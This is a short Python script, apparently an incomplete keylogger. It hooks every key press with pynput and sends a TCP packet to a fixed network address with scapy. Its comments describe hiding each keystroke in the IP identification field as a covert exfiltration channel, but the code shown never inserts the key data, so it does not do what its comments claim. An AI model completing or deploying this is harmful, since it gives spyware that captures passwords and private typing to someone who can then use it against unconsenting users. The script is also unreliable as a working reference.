from pynput.keyboard import Key, Listener
from sys import exit
from scapy.all import IP, TCP, send

def on_press(key: Key):
    # Each on key press
    # 1. Create packet
    # 2. Place key press data into IP header identification field.
    # 3. Send packet to destination.
    packet = IP(dst="10.65.102.23")/TCP(sport=222, dport=222)
    send(packet)

if __name__ == "__main__":
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        exit(0)
